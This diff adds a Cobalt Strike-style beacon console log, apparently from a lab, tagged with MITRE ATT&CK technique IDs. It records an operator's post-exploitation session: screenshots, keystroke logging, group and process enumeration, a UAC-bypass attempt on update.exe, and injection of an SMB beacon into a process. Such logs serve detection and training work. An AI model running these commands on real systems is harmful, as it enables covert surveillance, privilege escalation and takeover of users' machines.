@@ -1,0 +1,164 @@
+08/17 19:44:28 UTC [metadata] 192.168.23.131 <- 192.168.23.131; computer: COMPUTER02; user: jdoe; process: notepad.exe; pid: 5560; os: Windows; version: 10.0; build: 18363; beacon arch: x64 (x64)
+08/17 19:45:32 UTC [input] <analyst01> sleep 1 20
+08/17 19:45:32 UTC [task] <T1029> Tasked beacon to sleep for 1s (20% jitter)
+08/17 19:46:22 UTC [checkin] host called home, sent: 16 bytes
+08/17 19:46:53 UTC [input] <analyst01> screenshot
+08/17 19:46:53 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+08/17 19:46:54 UTC [checkin] host called home, sent: 197186 bytes
+08/17 19:46:58 UTC [output]
+received screenshot (101494 bytes)
+
+08/17 19:47:48 UTC [input] <analyst01> keylogger
+08/17 19:47:48 UTC [task] <T1056, T1093> Tasked beacon to log keystrokes
+08/17 19:47:48 UTC [checkin] host called home, sent: 81474 bytes
+08/17 19:48:20 UTC [output]
+received keystrokes
+
+08/17 19:48:29 UTC [output]
+received keystrokes
+
+08/17 19:48:39 UTC [output]
+received keystrokes
+
+08/17 19:50:35 UTC [input] <analyst01> shell whoami /groups
+08/17 19:50:35 UTC [task] <> Tasked beacon to run: whoami /groups
+08/17 19:50:35 UTC [checkin] host called home, sent: 45 bytes
+08/17 19:50:35 UTC [output]
+received output:
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes                                        
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                     Alias            S-1-5-32-544 Group used for deny only                          
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    
+
+
+08/17 19:52:09 UTC [input] <analyst01> runasadmin C:\Users\jdoe\Downloads\update.exe
+08/17 19:52:09 UTC [error] runasadmin error: not enough arguments
+08/17 19:52:10 UTC [output]
+received keystrokes
+
+08/17 19:53:13 UTC [input] <analyst01> runasadmin uac-cmstplua C:\Users\jdoe\Downloads\update.exe
+08/17 19:53:13 UTC [task] <T1611> Tasked beacon to run C:\Users\jdoe\Downloads\update.exe in a high integrity context (uac-cmstplua)
+08/17 19:53:13 UTC [checkin] host called home, sent: 3075 bytes
+08/17 19:53:13 UTC [error] current process will not auto-elevate COM object. Try from a program that lives in c:\windows\*
+08/17 19:53:57 UTC [input] <analyst01> ps
+08/17 19:53:57 UTC [task] <> Tasked beacon to list processes
+08/17 19:53:57 UTC [checkin] host called home, sent: 12 bytes
+08/17 19:53:57 UTC [output]
+[System Process]	0	0
+System	0	4
+Registry	4	68
+smss.exe	4	268
+csrss.exe	360	368
+wininit.exe	360	468
+csrss.exe	460	476
+winlogon.exe	460	524
+services.exe	468	564
+lsass.exe	468	572
+svchost.exe	564	692
+fontdrvhost.exe	468	700
+fontdrvhost.exe	524	708
+svchost.exe	564	796
+dwm.exe	524	888
+svchost.exe	564	980
+svchost.exe	564	1000
+svchost.exe	564	1008
+svchost.exe	564	112
+svchost.exe	564	388
+svchost.exe	564	360
+svchost.exe	564	1036
+svchost.exe	564	1204
+svchost.exe	564	1264
+Memory Compression	4	1532
+svchost.exe	564	1584
+svchost.exe	564	1644
+svchost.exe	564	1684
+spoolsv.exe	564	1848
+svchost.exe	564	2016
+VGAuthService.exe	564	1388
+vmtoolsd.exe	564	1488
+svchost.exe	564	2080
+GoogleUpdate.exe	1000	2200
+dllhost.exe	564	2432
+WmiPrvSE.exe	692	2460
+svchost.exe	564	2772
+msdtc.exe	564	2908
+svchost.exe	564	3344
+sihost.exe	1000	3392	x64	EXAMPLE\jdoe	1
+svchost.exe	564	3416	x64	EXAMPLE\jdoe	1
+taskhostw.exe	1000	3480	x64	EXAMPLE\jdoe	1
+ctfmon.exe	360	3600	x64	EXAMPLE\jdoe	1
+explorer.exe	3784	3812	x64	EXAMPLE\jdoe	1
+GoogleCrashHandler.exe	2200	3932
+GoogleCrashHandler64.exe	2200	3940
+svchost.exe	564	3972	x64	EXAMPLE\jdoe	1
+WmiPrvSE.exe	692	3296
+dllhost.exe	692	2228	x64	EXAMPLE\jdoe	1
+svchost.exe	564	3560
+StartMenuExperienceHost.exe	692	4132	x64	EXAMPLE\jdoe	1
+WinProcess.exe	692	4204	x64	EXAMPLE\jdoe	1
+SearchUI.exe	692	4312	x64	EXAMPLE\jdoe	1
+WinProcess.exe	692	4424	x64	EXAMPLE\jdoe	1
+ApplicationFrameHost.exe	692	4608	x64	EXAMPLE\jdoe	1
+MicrosoftEdge.exe	692	4640	x64	EXAMPLE\jdoe	1
+GameBar.exe	692	4724	x64	EXAMPLE\jdoe	1
+browser_broker.exe	692	4828	x64	EXAMPLE\jdoe	1
+svchost.exe	564	4852
+Windows.WARP.JITService.exe	4852	4964
+WinProcess.exe	692	4180	x64	EXAMPLE\jdoe	1
+GameBarFTServer.exe	692	1564	x64	EXAMPLE\jdoe	1
+WinProcess.exe	692	5008	x64	EXAMPLE\jdoe	1
+SearchIndexer.exe	564	5128
+MicrosoftEdgeCP.exe	692	5136	x64	EXAMPLE\jdoe	1
+MicrosoftEdgeSH.exe	4180	5432	x64	EXAMPLE\jdoe	1
+GameBarFT.exe	5008	5684	x64	EXAMPLE\jdoe	1
+WinProcess.exe	692	5916	x64	EXAMPLE\jdoe	1
+SecurityHealthSystray.exe	3812	6080	x64	EXAMPLE\jdoe	1
+SecurityHealthService.exe	564	6124
+vm3dservice.exe	3812	2828	x64	EXAMPLE\jdoe	1
+vmtoolsd.exe	3812	2188	x64	EXAMPLE\jdoe	1
+OneDrive.exe	3812	3264	x86	EXAMPLE\jdoe	1
+notepad.exe	5676	5560	x64	EXAMPLE\jdoe	1
+WinStore.App.exe	692	3092	x64	EXAMPLE\jdoe	1
+WinProcess.exe	692	5408	x64	EXAMPLE\jdoe	1
+YourPhone.exe	692	4252	x64	EXAMPLE\jdoe	1
+WinProcess.exe	692	5660	x64	EXAMPLE\jdoe	1
+SgrmBroker.exe	564	3104
+svchost.exe	564	3136
+WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe	692	2472	x64	EXAMPLE\jdoe	1
+notepad.exe	3812	4064	x64	EXAMPLE\jdoe	1
+SecurityHealthHost.exe	692	5824	x64	EXAMPLE\jdoe	1
+ShellExperienceHost.exe	692	1052	x64	EXAMPLE\jdoe	1
+WinProcess.exe	692	5072	x64	EXAMPLE\jdoe	1
+rundll32.exe	5560	5816	x64	EXAMPLE\jdoe	1
+SearchProtocolHost.exe	5128	4600	x64	EXAMPLE\jdoe	1
+SearchFilterHost.exe	5128	3372
+
+
+08/17 19:54:57 UTC [input] <analyst01> inject 5916 x64 smb
+08/17 19:54:57 UTC [task] <T1055> Tasked beacon to inject windows/beacon_bind_pipe (\\.\pipe\mspipe_effe) into 5916 (x64)
+08/17 19:54:57 UTC [checkin] host called home, sent: 255546 bytes
+08/17 19:54:58 UTC [output]
+established link to child beacon: 192.168.23.131
+
+08/17 19:56:20 UTC [output]
+received keystrokes
+
+08/17 20:41:56 UTC [error] lost link to child beacon: 192.168.23.131
+08/17 20:43:12 UTC [input] <analyst01> exit
+08/17 20:43:12 UTC [task] <> Tasked beacon to exit
+08/17 20:43:12 UTC [checkin] host called home, sent: 8 bytes
+08/17 20:43:12 UTC [output]
+beacon exit.
+
